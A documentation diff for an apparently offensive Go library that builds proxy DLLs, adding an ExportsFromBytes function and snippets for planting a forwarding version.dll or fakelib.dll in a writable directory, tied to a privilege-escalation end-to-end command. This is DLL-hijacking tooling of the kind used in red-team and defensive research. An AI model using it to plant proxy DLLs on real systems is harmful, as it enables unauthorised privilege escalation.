@@ -304,6 +304,30 @@ proxy, _ := dllproxy.Generate("version.dll", exports, dllproxy.Options{})
 _ = os.WriteFile(`C:\writable\dir\version.dll`, proxy, 0o644)
 ```
 
+### ExportsFromBytes — one-shot named-export extraction
+
+`func ExportsFromBytes(peBytes []byte) ([]Export, error)`
+
+Parses a target DLL's bytes via `pe/parse.FromBytesFast` and
+returns its named exports already shaped for `GenerateExt` /
+`packer.PackProxyDLL`. Ordinal-only entries are skipped (the
+forwarder emitter currently only builds `<target>.<name>`
+strings). Empty result is non-fatal — the caller decides.
+
+```go
+dll, _ := os.ReadFile(`C:\Vulnerable\fakelib.dll`)
+exports, err := dllproxy.ExportsFromBytes(dll)
+if err != nil {
+    log.Fatal(err)
+}
+proxy, _ := dllproxy.GenerateExt("fakelib", exports, dllproxy.Options{})
+```
+
+End-to-end consumer:
+[`cmd/privesc-e2e`](../../../cmd/privesc-e2e/README.md) (Mode 10
+re-reads `fakelib.dll` from the target post-drop so an operator
+could swap it for any DLL between runs).
+
 ### Composed — find an opportunity and bake a matching payload
 
 ```go
